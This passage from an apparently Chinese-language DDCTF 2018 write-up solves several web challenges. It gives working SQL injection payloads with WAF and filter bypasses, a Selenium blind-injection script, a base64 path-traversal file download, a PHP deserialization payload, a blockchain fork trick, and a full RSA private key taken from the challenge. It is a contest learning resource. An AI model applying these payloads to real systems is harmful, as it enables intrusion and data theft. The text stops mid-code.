\"r\")\nfp1 = open(\"file.png\", \"wb\")\n\nfp1.write(base64.b64decode(fp.read()))\n```\n\n然后，就可以得到一个file.png。\n\n![avatar](/images/ddctf/20180425151942.png)\n\n然后，就是将图片中的字符串提取出来。\n\n```\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n```\n\n再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。\n\n一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。\n\n## 得到flag\n今天是ddctf最后一天，\"喝杯java\"，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。\n\nrsa密钥也就是，保存一下就行了:\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n-----END RSA PRIVATE KEY-----\n```\n\n\n![avatar](/images/ddctf/20180420184445.png)\n\n然后，查看http包，flag就出来了。\n\n![avatar](/images/ddctf/20180420183706.png)\n\n# 数据库的秘密\n## X-forwarded-for\n首先打开网页，可以看到\"非法链接，只允许来自 123.232.23.245 的访问\",很容易就想到修改X-forwarded-for, Chrome下我使用[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件,然后修改一下X-forwarded-for就行了\n## 寻找注入点\n既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。\n\n* id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。\n* title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。\n* author\n  * \"admin\", 会得到author 为 \"admin\" 的两条记录\n  * \"admin'\", 一条记录都没有\n  * \"admin'#\", 同样会得到author 为 \"admin\" 的两条记录，那注入点应该就是这里了。\n  * \"admin' and 1=1#\", 发现会有网站防火墙拦截，应该是\"and\"被拦截，可以使用\"&&\"来替换\"and\",然后，同样会查询出两条记录。\n\n## 注入 \n找到注入点之后，就好办了。\n\n* \"admin' order by 6#\", 失败，\"admin' order by 5#\"，成功查询，那就是5列了。 \n* \"admin' union select 1,2,3,4,5#\", 被防火墙拦截，然后就是各种测试\"union select\",没能成功绕过(比赛结束之后，有师傅说可以绕过，[链接](https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md)，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。\n* \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)<'z')#\",成功拿到数据，接下来就是写脚本拿flag了。\n  脚本如下:\n\n```\nimport time\nfrom selenium import webdriver\nimport string\n\nstrings = string.ascii_letters + string.punctuation + string.digits\nstring_value = \",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}\"\nurl=\"http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php\"\npath=\"D:\\\\python\\\\chromedriver.exe\"\ndriver = webdriver.Chrome(executable_path=path)\npayload = \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s')#\"\npayload_table = \"admin' && 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%d,1)='%s')#\"\npayload_column = \"admin' && 1=(substr((select group_concat(column_name) from information_schema.columns where table_name='ctf_key7'),%d,1)='%s')#\"\npayload_value = \"admin' && 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord('%s'))#\"\n\ndef inject():\n    data = \"\"\n\n    driver.get(url)\n    input(\"jixu:\")\n    judge = True\n    index = 1\n    while judge:\n        judge_temp = False\n        for i in string_value:\n            payload_temp = payload_value % (index, i)\n            print(payload_temp)\n            driver.get(url)\n            driver.execute_script('document.getElementById(\"author\").type=\"text\"')\n            driver.find_element_by_id(\"author\").send_keys(payload_temp)\n            driver.find_element_by_id(\"button\").click()\n            if \"admin\" in driver.page_source:\n                data += i\n                index += 1\n                judge_temp = True\n                print(data)\n                break\n            time.sleep(1)\n        if judge_temp is not True:\n            driver.close()\n\t\t\tjudge = False\n\ninject(payload_value)\n# table_schema:  ddctf\n# tables: ctf_key7, message\n# columns: ctf_key7下: secvalue，flag就保存在sevalue里边\n```\n\n## 注意点\n*  每次请求时，js都会计算一个sig值和time值，计算方法在main.js中\n   <code>\n   eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('e f(0,4){5 7=\\'\\';l(i m 0){n(i!=\\'c\\'){a=\\'\\';a=i+\\'=\\'+0[i];7+=a}}o k(7+4)};5 0={8:\\'\\',9:\\'\\',b:\\'\\',6:\\'\\',d:h(j v().u()/w)};e x(){0[\\'8\\']=1.2(\\'8\\').3;0[\\'9\\']=1.2(\\'9\\').3;0[\\'b\\']=1.2(\\'b\\').3;0[\\'6\\']=1.2(\\'6\\').3;5 c=f(0,4);1.2(\\'g\\').q=\"p.s?r=\"+c+\"&d=\"+0.d;1.2(\\'g\\').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{}))  \n   </code>\n   看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。\n\n*  由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:\n\n```\ndriver.get(url)\ninput(\"jixu:\")\n```\n首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。\n\n# 专属链接\n## 任意文件下载\n首先F12抓包，会看到一个有意思的请求，http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,\"ZmF2aWNvbi5pY28=\",base64_encode之后就是\"favicon.ico\",图片的内容如下:\"you can only download .class .xml .ico .ks files\",表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。\n\n![avatar](/images/ddctf/20180421191033.png)\n\n其中需要注意的有三个文件，\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造\"116.85.48.102:5050/flag/test/flag/DDCTF{BASD}\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/images/ddctf/201804211191034.png)\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造\"116.85.48.102:5050/image/banner/[随便一个错误的地址]\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/images/ddctf/20180421191037.png)\n\n* _.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过\"116.85.48.102:5050/base64_encode('../../WEB-INF/classes/email.txt/a/../')\",(注意，base64_encode('../../WEB-INF/classes/email.txt/a/../')是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。\n\n## 审计代码\n\n下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。\n其中最重要的两个文件是FlagController.class和InitListener.class。\n\n* FlagController.class\n\n```\npublic String getFlag(@PathVariable(\"email\") String email, ModelMap model) {\n        Flag flag = this.flagService.getFlagByEmail(email);\n        return \"Encrypted flag : \" + flag.getFlag();\n    }\n```\n在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。\n\n* InitListener.class\n\n```\npublic void onApplicationEvent(ApplicationEvent event) {\n        if(event.getSource() instanceof ApplicationContext) {\n            WebApplicationContext ctx = (WebApplicationContext)event.getSource();\n            if(ctx.getParent() == null) {\n                String regenflag = this.properties.getProperty(\"regenflag\");\n                if(regenflag != null && \"false\".equals(regenflag)) {\n                    System.out.println(\"skip gen flag\");\n                } else {\n                    try {\n                        this.flagService.deleteAll();\n                        int id = 1;\n                        String path = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/emails.txt\");\n                        String ksPath = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/sdl.ks\");\n                        System.out.println(path);\n                        String emailsString = FileUtils.readFileToString(new File(path), \"utf-8\");\n                        String[] emails = emailsString.trim().split(\"\\n\");\n                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                        FileInputStream inputStream = new FileInputStream(ksPath);\n                        keyStore.load(inputStream, this.p.toCharArray());\n                        Key key = keyStore.getKey(\"www.didichuxing.com\", this.p.toCharArray());\n                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n                        cipher.init(1, key);\n                        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n                        Mac mac = Mac.getInstance(\"HmacSHA256\");\n                        mac.init(signingKey);\n                        SecureRandom sr = new SecureRandom();\n                        String[] var16 = emails;\n                        int var17 = emails.length;\n\n                        for(int var18 = 0; var18 < var17; ++var18) {\n                            String email = var16[var18];\n                            String flag = \"DDCTF{\" + Math.abs(sr.nextLong()) + \"}\";\n                            String uuid = UUID.randomUUID().toString().replace(\"-\", \"s\");\n                            byte[] data = cipher.doFinal(flag.getBytes());\n                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n                            Flag flago = new Flag();\n                            flago.setId(Integer.valueOf(id));\n                            flago.setFlag(byte2hex(data));\n                            flago.setEmail(byte2hex(e));\n                            flago.setOriginFlag(flag);\n                            flago.setUuid(uuid);\n                            flago.setOriginEmail(email);\n                            this.flagService.save(flago);\n                            System.out.println(email + \"同学的入口链接为：http://116.85.48.102:5050/welcom/\" + uuid);\n                            ++id;\n                            System.out.println(flago);\n                        }\n                    } catch (KeyStoreException var25) {\n                        var25.printStackTrace();\n                    } catch (IOException var26) {\n                        var26.printStackTrace();\n                    } catch (NoSuchAlgorithmException var27) {\n                        var27.printStackTrace();\n                    } catch (CertificateException var28) {\n                        var28.printStackTrace();\n                    } catch (UnrecoverableKeyException var29) {\n                        var29.printStackTrace();\n                    } catch (NoSuchPaddingException var30) {\n                        var30.printStackTrace();\n                    } catch (InvalidKeyException var31) {\n                        var31.printStackTrace();\n                    } catch (IllegalBlockSizeException var32) {\n                        var32.printStackTrace();\n                    } catch (BadPaddingException var33) {\n                        var33.printStackTrace();\n                    }\n\n                }\n            }\n        }\n    }\n```\n该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。\n\n## 获取flag\n* 生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。\n\n```\npublic class cipher {\n    public static  void main(String[] args) throws Exception {\n        gencipher();\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n    }\n\n    public static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n//        Key key = keyStore.getKey(\"www.didichuxing.com\", p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n\n    public static String byte2hex(byte[] b) {\n        StringBuilder hs = new StringBuilder();\n\n        for(int n = 0; b != null && n < b.length; ++n) {\n            String stmp = Integer.toHexString(b[n] & 255);\n            if(stmp.length() == 1) {\n                hs.append('0');\n            }\n\n            hs.append(stmp);\n        }\n\n        return hs.toString().toUpperCase();\n    }\n\n    public static byte[] hexStringToBytes(String hexString) {\n        if (hexString == null || hexString.equals(\"\")) {\n            return null;\n        }\n        hexString = hexString.toUpperCase();\n        int length = hexString.length() / 2;\n        char[] hexChars = hexString.toCharArray();\n        byte[] d = new byte[length];\n        for (int i = 0; i < length; i++) {\n            int pos = i * 2;\n            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));\n        }\n        return d;\n    }\n\n    private static byte charToByte(char c) {\n        return (byte) \"0123456789ABCDEF\".indexOf(c);\n    }\n}\n```\n通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。\n\n```\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n```\n拿到该加密后的邮箱，就可以获得加密后的flag。\n\n ![avatar](/images/ddctf/20180421191047.png)\n\n拿到加密之后的flag之后，就可以解密了。\n\n```\npublic static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n```\n该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可\n\n```\nString ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nFileInputStream inputStream = new FileInputStream(ksPath);\nkeyStore.load(inputStream, p.toCharArray());\nKey key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n```\n然后就可以解密得到flag.\n> DDCTF{5218295657878818503}\n\n# 注入的奥妙\n## sql注入\n首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号\"‘\"，发现输出竟然乱码。\n\n ![avatar](/images/ddctf/20180421195946.png)\n\n 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。\n\n ![avatar](/images/ddctf/20180421200130.png)\n\n 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\n\n ![avatar](/images/ddctf/20180421200307.png)\n\n 我选择了\"么\"\n\n ![avatar](/images/ddctf/20180421200748.png)\n\n 通过测试\"http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88'\"，可以看到单引号成功逃逸。\n\n```\n\n 最后拼接的参数是 : ?\\\\'\n​~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~\n很遗憾没有找到数据 可以试试别的 ！\n42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''?\\\\''' at line 1\n```\n单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加\"collate utf8_general_cli\",强制转换编码即可。\n\n* 获取数据库。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  \n   得到结果\"sqli\"\n* 获取'sqli'下的table。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  \n   得到结果\"message,route_rules\"\n* 获取\"route_rules\"的列名。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  \n   得到结果\"id,pattern,action,rulepass\"\n* 然后获取route_rules表中的数据。\n   数据如下:  \n   1   get*/   u/well/getmessage/   \n   12  get*/   u/justtry/self/  \n   13  post*/  u/justtry/try  \n   15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip\n\n## 代码审计\n通过上边的\"116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css\"，可以拿到代码。\n\n+ Jusstry.php\n\n```\npublic function try($serialize)\n{\n    unserialize(urldecode($serialize), [\"allowed_classes\" => [\"Index\\Helper\\Flag\", \"Index\\Helper\\SQL\",\"Index\\Helper\\Test\"]]);\n}\n```\n通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。\n\n+ Flag.php\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse PDO;\nuse Index\\Helper\\SQL;\n\ndefined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n\n    //\n    public function get($user)\n    {\n\n        $tmp=$this->sql->FlagGet($user);\n        if ($tmp['status']===1) {\n            return $this->sql->FlagGet($user)['flag'];\n        }\n    }\n}\n\n```\n该类说明只要调用get方法就可以得到指定用户的flag。\n\n+ Test.php\n\n```\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        $this->getflag('ctfuser', $this->user_uuid);\n    }\n\n    public function setflag($m = 'ctfuser', $u = 'default', $o = 'default')\n    {\n        $user=array(\n            'name' => $m,\n            'oldid' => $o,\n            'id' => $u\n        );\n        // var_dump($user);\n\n        echo $this->fl->set($user, 2);\n    }\n\n    public function getflag($m = 'ctfuser', $u = 'default')\n    {\n        //TODO: check username\n        $user=array(\n            'name' => $m,\n            'id' => $u\n        );\n        //懒了直接输出给你们了\n        echo 'DDCTF{'.$this->fl->get($user).'}';\n    }\n}\n```\n在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\"，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse Index\\Helper\\Flag;\nuse Index\\Helper\\UUID;\n\nclass SQL\n{\n    public $dbc;\n    public $pdo;\n\n    //\n    public function __construct()\n    {\n    }\n}\n\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n}\n\n\n// defined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        // $this->getflag('ctfuser', $this->user_uuid);\n    }\n}\n\necho serialize(new Test());\n```\n即可得到序列化之后的值:\"hhkjjhkhjkhjkhkjhkhkhkO:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}}\",然后就可以得到flag了。\n\n ![avatar](/images/ddctf/20180421150038.png)\n\n# mini blockchain\n## 构造符合条件的区块\n```\nimport json\nimport hashlib\nfrom itertools import product\nimport string\nfrom functools import reduce\nimport rsa\n\nEMPTY_HASH = '0' * 64\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n\n\ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n\n\ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'],\n                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n\nblock = {\n    \"nonce\": \"6h0F\",\n    \"prev\": \"0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8\",\n    \"transactions\": []\n  }\n\nc = string.ascii_lowercase + \"0123456789ABCDEFGHI\"\n\ncaptchas = [''.join(i) for i in product(c, repeat=4)]\n\nprint('[+] Genering {} captchas...'.format(len(captchas)))\nwith open('captchas.txt', 'w') as f:\n    for k in captchas:\n        block[\"nonce\"] = k\n        f.write(hash_block(block)[:5] + ' --> ' + k + '\\n')\n```\n\"nonce\"值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。\n\n## 解题\n初始区块链如图所示:\n\n ![avatar](/images/ddctf/20180421221550.png)\n\n然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block['height']来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。\n\n```\ndef find_blockchain_tail():\n    return max(session['blocks'].values(), key=lambda block: block['height'])\n```\n\n ![avatar](/images/ddctf/20180421222032.png)\n\n从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。\n\n ![avatar](/images/ddctf/20180421222814.png)\n\n接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。\n\n ![avatar](/images/ddctf/20180421223014.png)\n\n需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。\n\n# 我的博客\n## 审计代码\n根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。\n### index.php\n\n```\nif(isset($_GET['id'])){\n    $id = addslashes($_GET['id']);\n    if(isset($_GET['title'])){\n        $title = addslashes($_GET['title']);\n        $title = sprintf(\"AND title='%s'\", $title);\n    }else{\n        $title = '';\n    }\n    $sql = sprintf(\"SELECT * FROM article WHERE id='%s' $title\", $id);\n\n    foreach ($pdo->query($sql) as $row) {\n        echo \"<h1>\".$row['title'].\"</h1><br>\".$row['content'];\n        die();\n    }\n}\n```\n可以看到该地方使用了两次sprintf，可以立马想到[从WordPress SQLi谈PHP格式化字符串问题](https://paper.seebug.org/386/),问题就是，需要以admin的身份登录。\n\n### login.php\n\n```\nif($_SERVER['REQUEST_METHOD'] === \"POST\") {\n    if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] !== $password) {\n        die('wrong password');\n    }\n\n    $sth = $pdo->prepare('SELECT 